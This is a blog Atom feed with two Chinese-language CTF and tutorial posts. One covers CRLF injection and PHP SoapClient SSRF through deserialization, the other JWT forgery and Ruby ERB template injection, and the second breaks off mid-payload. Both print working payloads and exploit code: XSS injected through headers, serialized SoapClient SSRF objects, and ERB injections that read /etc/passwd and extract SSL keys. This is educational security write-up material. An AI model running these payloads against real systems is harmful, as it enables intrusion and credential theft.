<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-18T05:01:18.505Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF</title>
    <link href="http://example.com/2021/10/18/CRLF%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8ASoapClinet%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2021/10/18/CRLF%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8ASoapClinet%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-10-17T16:00:00.000Z</published>
    <updated>2021-10-18T05:01:18.505Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF"><a href="#CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF" class="headerlink" title="CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF"></a>CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF</h1><h2 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>CRLF是“回车+换行(\r\n)”的简称，在http协议中，httpheader和httpbody是用两个CRLF分隔的，浏览器是根据这两个CRLF来取出http内容并显示出来的，所以如果我们可以控制http消息头的字符，注入一些恶意的换行，这样可以注入一些会话Cookie或HTML代码，所以CRLF injection也叫HTTPReaponseSplitting，简称HRS</p><h4 id="CRLF注入产生的会话固定漏洞"><a href="#CRLF注入产生的会话固定漏洞" class="headerlink" title="CRLF注入产生的会话固定漏洞"></a>CRLF注入产生的会话固定漏洞</h4><p>当我们可以控制httpheader中的location字段时，我们可以就可以给访问者设置一个SESSION</p><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 </span><br><span class="line">Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line">Content- Type: text/html</span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close</span><br><span class="line">Location:http://www.sina.com.cn</span><br></pre></td></tr></table></figure><p>然后当我们输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sina.com.cn%0d%0aSet-cookie:JSPSESSID%3Dwooyun</span><br></pre></td></tr></table></figure><p>此时我们就设置了一个SESSION，造成会话固定漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT</span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close </span><br><span class="line">Location: http://www.sina.com.cn</span><br><span class="line">Set-cookie: JSPSESSID=wooyun</span><br></pre></td></tr></table></figure><h4 id="CRLF注入造成无视浏览器Filter反射型XSS"><a href="#CRLF注入造成无视浏览器Filter反射型XSS" class="headerlink" title="CRLF注入造成无视浏览器Filter反射型XSS"></a>CRLF注入造成无视浏览器Filter反射型XSS</h4><p>实例</p><p>当一个网站接受url参数<a href="http://ip/?url=xxx%EF%BC%8Cxxx%E6%94%BE%E5%9C%A8location%E5%90%8E%E9%9D%A2%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E8%B7%B3%E8%BD%AC%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5">http://ip/?url=xxx，xxx放在location后面作为一个跳转，所以我们可以输入</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.sina.com.cn/?url=%0d%0a%0d%0a&lt;imgsrc=1onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>则我们的返回包为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT Content-Type: text/html Content-Length: 154 Connection: close Location: </span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>之前说的浏览器会根据两个CRLF把HTTP包分成头和体，然后将体显示出来，所以这里这个标签会显示出来，，造成xss</p><p>对于无视filter，只有数据包中http头中含有X-XSS-Protection并且为0时，浏览器才不会开启filter，所以我们可以利用一个CRLF将X-XSS-Protection: 0注入到数据包中，再用两个CRLF来注入xss代码，这样就可以绕过filter</p><p>而对于Location的注入只有webkit内核浏览器可以使用，其它浏览器可能会跳转</p><h2 id="SOAP漏洞利用之CRLF与SSRF"><a href="#SOAP漏洞利用之CRLF与SSRF" class="headerlink" title="SOAP漏洞利用之CRLF与SSRF"></a>SOAP漏洞利用之CRLF与SSRF</h2><p>每种开发语言都有自己的webservice实现框架，php也有，php的SOAP扩展是可以提供和使用webservices，这个扩展实现六个类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">高级类：SoapClient、SoapServer、SoapFault</span><br><span class="line"></span><br><span class="line">低级类：SoapHeader、SoapParam 和 SoapVar</span><br></pre></td></tr></table></figure><p>SoapClient语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</span><br></pre></td></tr></table></figure><p>由于SoapClinet类中的一个$options选项功能有这样一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The user_agent option specifies string to use in User-Agent header</span><br></pre></td></tr></table></figure><p>可见这个类可以让我们自定义user-agent，而httpheader有一个重要的content-type和content-length字段，可以控制发送的方式以及内容的长度，而user-agent在它们的上面，所以可以进行覆盖</p><p>因此我们可以利用CRLF来构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$payload = new SoapClient(null,array(&#x27;user_agent&#x27;=&gt;&quot;testrnCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32rnContent-Type: application/x-www-form-urlencodedrnContent-Length:45rnrnusername=admin&amp;password=nu1ladmin&amp;code=470837rnrnrn&quot;,&#x27;location&#x27;=&gt;$location,</span><br><span class="line">&#x27;uri&#x27;=&gt;$uri));</span><br></pre></td></tr></table></figure><p>这个攻击的作用是从外网调用到soap的api来攻击内网，因此可以说是ssrf攻击</p><p>而这个攻击一般是利用SoapClient类中的魔术方法__call()触发的，猜测是触发__call()魔术方法发包</p><h2 id="实例（bestphp’s-revenge）"><a href="#实例（bestphp’s-revenge）" class="headerlink" title="实例（bestphp’s revenge）"></a>实例（bestphp’s revenge）</h2><p>打开页面，审计源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &#x27;implode&#x27;;</span><br><span class="line">call_user_func($_GET[&#x27;f&#x27;], $_POST);</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&#x27;name&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>由于call_user_func()函数限制了一些函数，eval()函数在其中，而构造/flag.php，又得到一部分源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">echo &#x27;only localhost can get flag!&#x27;;</span><br><span class="line">$flag = &#x27;LCTF&#123;*************************&#125;&#x27;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&#x27;flag&#x27;] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>可见我们要本地访问/flag.php才可以读取flag，所以我们可以利用SoapClient类来ssrf，首先我们需要利用反序列化来控制SoapClient类中的变量，所以我们可以利用序列化引擎和反序列化引擎的不同，导致无法正常反序列化，从而伪造数据</p><p>所以我们可以利用第一个call_user_func来构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_start([&#x27;serialize_handler&#x27;=&gt;&#x27;php_serialize&#x27;])</span><br></pre></td></tr></table></figure><p>来让序列化和反序列化的引擎不同，然后再通过将序列化数据赋值给$_SESSION[“name”]，让它将数据存储到文件时再进行序列化，并进行变量覆盖，然后取出文件，放进内存时进行反序列化，而由于我们设置的序列化和反序列化的引擎不同，所以当反序列化时会将”|“前面的值当成是键名，从而可以触发漏洞，exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &quot;http://127.0.0.1/flag.php&quot;;</span><br><span class="line">$attack = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,</span><br><span class="line">    &#x27;user_agent&#x27; =&gt; &quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;,</span><br><span class="line">    &#x27;uri&#x27; =&gt; &quot;123&quot;));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line">echo $payload;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以我们可以先构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get提交</span><br><span class="line">?f=session_start&amp;name=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">serialize_handler=php_serialize</span><br></pre></td></tr></table></figure><p>然后我们再构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get提交</span><br><span class="line">?f=extract&amp;name=SoapClient</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure><p>通过extract函数来对$b变量进行覆盖，然后再通过调用SoapClient类中不存在的welcome_to_the_lctf2018函数来触发__call()魔术方法，从而将flag赋值给$_SESSION[“flag”]</p><p>最后用刚刚构造的PHPSESSID值来读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</span><br></pre></td></tr></table></figure><p>参考文章：[<a href="https://cloud.tencent.com/developer/article/1515276]">https://cloud.tencent.com/developer/article/1515276]</a></p><pre><code>[https://www.anquanke.com/post/id/153065#h2-1][https://www.jianshu.com/p/d4c304dbd0af][https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0]</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF&quot;&gt;&lt;a href=&quot;#CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF&quot; class=&quot;headerlink&quot; title=&quot;CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF&quot;&gt;&lt;/a&gt;CRLF漏洞以及</summary>
      
    
    
    
    
    <category term="ssrf" scheme="http://example.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>ruby ERB模板注入以及jwt伪造</title>
    <link href="http://example.com/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/"/>
    <id>http://example.com/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/</id>
    <published>2021-10-16T16:00:00.000Z</published>
    <updated>2021-10-17T14:05:35.550Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ruby-ERB模板注入以及jwt伪造"><a href="#ruby-ERB模板注入以及jwt伪造" class="headerlink" title="ruby ERB模板注入以及jwt伪造"></a>ruby ERB模板注入以及jwt伪造</h1><p>打开页面后，发现有一个buy flag，但是钱不够，所以我们尝试抓包</p><p>发现Cookie字段有一个jwt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJlMWFjYmQ3OC01OTNlLTQ4NzYtOTNhZi00ZWNhYmRkZmYyMDQiLCJqa2wiOjIwfQ.1uVjLWKyyci-TEaw7kxUi9vuGvYDgZ1IF3UuvcIcJtU</span><br></pre></td></tr></table></figure><p>打开jwt.io网页，进行解码</p><p>HEADER</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PAYLOAD</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;uid&quot;: &quot;e1acbd78-593e-4876-93af-4ecabddff204&quot;,</span><br><span class="line">  &quot;jkl&quot;: 20</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>密钥部分不知道，但是我们可以尝试将PAYLOAD中的jkl改为1000000000000000000000000000，来伪造价格，但是密钥不知道，这里爆破的话有点麻烦，但是我们通过目录的扫描，发现robots.txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /filebak</span><br></pre></td></tr></table></figure><p>所以访问/filebak，得到ruby语言的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;sinatra/cookies&#x27;</span><br><span class="line">require &#x27;sinatra/json&#x27;</span><br><span class="line">require &#x27;jwt&#x27;</span><br><span class="line">require &#x27;securerandom&#x27;</span><br><span class="line">require &#x27;erb&#x27;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &#x27;/shop&#x27;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&#x27;/shop&#x27;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我们可以查看jwt加密和解密那部分代码</p><p>加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>看代码可知，jwt密钥部分是用HS256加密的，口令为ENV[“SECRET”]，所以我们需要想办法知道ENV[“SECRET”]，所以我们可以查看解密的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br></pre></td></tr></table></figure><p>我们可以从</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>中的alert()函数，判断它可能是Ruby ERB模板注入</p><h2 id="Ruby-ERB模板注入"><a href="#Ruby-ERB模板注入" class="headerlink" title="Ruby ERB模板注入"></a>Ruby ERB模板注入</h2><p>对与Ruby ERB模板注入来说，&lt;%=是用来执行ruby语句的，会将结果转换为字符串，所以我们可以尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=7*7%&gt;</span><br></pre></td></tr></table></figure><p>来查看它是否存在ruby erb模板注入，如果存在的话，我们可以使用自带的全局函数来测试是否执行函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br></pre></td></tr></table></figure><p>如果不可以成功的话，可能是因为Ruby的ERB模板引擎包含一个安全级别参数，当安全级别设置为0以上的某个值（如：3）时，我们将无法在模板绑定中执行包括文件操作在内的某些函数，如果设置为4，则只可以执行标记为可信状态的那些代码，所以此时我们可以尝试枚举该对象的可用属性以及方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self %&gt;</span><br></pre></td></tr></table></figure><p>然后可以尝试获取self对象的类名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.class.name %&gt;</span><br></pre></td></tr></table></figure><p>得到类名后，我们可以尝试枚举类的可用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= self.methods %&gt;</span><br></pre></td></tr></table></figure><p>我们可以将数据传递给这些函数，以达到未授权访问的目的，虽然我们不清楚使用的web框架，但是我们要向服务器发送HTTP POST请求，所以我们可以使用handlePOST或doPOST函数内部，来借此访问某些局部变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.method(:handle_POST).parameters %&gt;</span><br></pre></td></tr></table></figure><p>我们可以看见3个req参数，该参数可能代表的是某个请求对象，rsp参数可能代表的是响应数据的引用，最后session参数可能是某个id或某个对象，所以我们可以查看session对象的具体含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=session.class.name %&gt;</span><br></pre></td></tr></table></figure><p>我们可以看见WEBrick是Ruby在标准库中实现的原生web服务器，我们还可以探索其它有用的信息</p><p>我们可以使用某些内省方法来确认我们是否可以访问这些变量以及其它可用变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.instance_variables %&gt;</span><br></pre></td></tr></table></figure><p>当WEBrick被实例化以处理客户端请求时，它会将某个http服务器实例传递给servlet，这很有可能是@server这个实例变量，所以我们可以调用.instance_variables方法来观察这个对象包含哪些成员变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=@server.instance_variables %&gt;</span><br></pre></td></tr></table></figure><p>我们可以看见@ssl_context变量，这个变量可能会包含某些密钥或其它有用信息，所以我们可以改变一下语法来创建自己的局部变量，保存@sll_context的引用，使载荷可读性更好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;</span><br></pre></td></tr></table></figure><p>此时我们可以看见有@key，所以我们可以提取出这个变量的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;</span><br></pre></td></tr></table></figure><p>回到题目本身，我们可以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=7*7 %&gt;&amp;do=&lt;%=7*7 